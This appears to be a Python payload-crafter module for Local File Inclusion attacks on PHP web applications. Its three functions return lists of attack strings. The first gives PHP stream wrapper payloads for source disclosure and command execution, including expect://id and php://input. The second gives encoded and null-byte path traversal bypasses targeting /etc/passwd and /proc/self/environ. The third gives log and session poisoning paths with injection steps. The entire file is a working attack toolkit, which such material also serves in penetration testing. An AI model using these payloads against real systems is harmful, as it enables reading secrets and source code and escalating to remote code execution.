"""
LFI (Local File Inclusion) & PHP Stream Wrapper Payload Crafter.
Provides PHP wrappers, path traversal bypasses, and log/session poisoning references.
"""

from typing import List, Dict, Any


def get_php_wrappers(target_file: str = "index.php") -> List[Dict[str, str]]:
    """Return a list of PHP stream wrapper payloads for reading source code."""
    return [
        {
            "name": "php://filter base64",
            "payload": f"php://filter/convert.base64-encode/resource={target_file}",
            "desc": "Read source code as base64 (bypasses direct execution)"
        },
        {
            "name": "php://filter rot13",
            "payload": f"php://filter/read=string.rot13/resource={target_file}",
            "desc": "Read source code ROT13-encoded"
        },
        {
            "name": "php://filter strip_tags",
            "payload": f"php://filter/read=string.strip_tags/resource={target_file}",
            "desc": "Strip HTML tags to reveal PHP source"
        },
        {
            "name": "php://filter zlib",
            "payload": f"php://filter/zlib.deflate/convert.base64-encode/resource={target_file}",
            "desc": "Compressed base64 source read"
        },
        {
            "name": "php://input",
            "payload": "php://input",
            "desc": "Read POST body as file (for LFI to RCE)"
        },
        {
            "name": "data:// wrapper",
            "payload": "data://text/plain;base64,PD9waHAgZWNobyAncG5nJzsgPz4=",
            "desc": "data:// wrapper for code execution"
        },
        {
            "name": "expect:// wrapper",
            "payload": "expect://id",
            "desc": "expect:// wrapper for command execution (requires expect extension)"
        },
        {
            "name": "phar:// wrapper",
            "payload": f"phar://{target_file}",
            "desc": "PHAR deserialization wrapper"
        },
        {
            "name": "zip:// wrapper",
            "payload": f"zip://{target_file}#shell",
            "desc": "ZIP archive wrapper"
        },
        {
            "name": "php://filter iconv",
            "payload": f"php://filter/convert.iconv.utf-8.utf-16/resource={target_file}",
            "desc": "Iconv conversion to bypass filters"
        }
    ]


def get_traversal_bypasses(target_file: str = "/etc/passwd") -> List[Dict[str, str]]:
    """Return a list of path traversal bypass payloads."""
    return [
        {
            "name": "Basic traversal",
            "payload": f"../../../../../../../../..{target_file}",
            "desc": "Standard directory traversal"
        },
        {
            "name": "Double encoding",
            "payload": f"..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{target_file}",
            "desc": "Double URL-encoded traversal (bypasses basic filters)"
        },
        {
            "name": "Nested traversal",
            "payload": f"....//....//....//....//....//....//....//....//{target_file}",
            "desc": "Nested slashes bypass (....// = ../)"
        },
        {
            "name": "URL encoded",
            "payload": f"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{target_file}",
            "desc": "URL-encoded slashes"
        },
        {
            "name": "Null byte",
            "payload": f"../../../../../../../../..{target_file}%00",
            "desc": "Null byte truncation (PHP < 5.3.4)"
        },
        {
            "name": "Absolute path",
            "payload": target_file,
            "desc": "Direct absolute path"
        },
        {
            "name": "Windows traversal",
            "payload": f"..\\..\\..\\..\\..\\..\\..\\..\\..\\{target_file}",
            "desc": "Windows backslash traversal"
        },
        {
            "name": "Double slash",
            "payload": f"..//..//..//..//..//..//..//..//{target_file}",
            "desc": "Double slash bypass"
        },
        {
            "name": "Mixed encoding",
            "payload": f"..%c0%af..%c0%af..%c0%af..%c0%af{target_file}",
            "desc": "UTF-8 overlong encoding bypass"
        },
        {
            "name": "Proc self environ",
            "payload": "../../../../../../../../proc/self/environ",
            "desc": "Read process environment (may contain secrets)"
        }
    ]


def get_poisoning_targets() -> List[Dict[str, str]]:
    """Return a list of log/session poisoning targets."""
    return [
        {
            "name": "Apache Access Log",
            "path": "/var/log/apache2/access.log",
            "technique": "Inject code in User-Agent, then LFI the log"
        },
        {
            "name": "Apache Error Log",
            "path": "/var/log/apache2/error.log",
            "technique": "Inject code in request, then LFI the error log"
        },
        {
            "name": "Nginx Access Log",
            "path": "/var/log/nginx/access.log",
            "technique": "Inject code in User-Agent, then LFI the log"
        },
        {
            "name": "PHP Session File",
            "path": "/var/lib/php/sessions/sess_<PHPSESSID>",
            "technique": "Set session value to code, then LFI session file"
        },
        {
            "name": "SSH Auth Log",
            "path": "/var/log/auth.log",
            "technique": "Inject code in SSH username, then LFI the log"
        },
        {
            "name": "Mail Log",
            "path": "/var/log/mail.log",
            "technique": "Inject code in email headers, then LFI the log"
        },
        {
            "name": "Proc Self Environ",
            "path": "/proc/self/environ",
            "technique": "Inject code in User-Agent, then LFI /proc/self/environ"
        },
        {
            "name": "Proc Self Fd",
            "path": "/proc/self/fd/<N>",
            "technique": "Brute-force file descriptors for request body"
        }
    ]
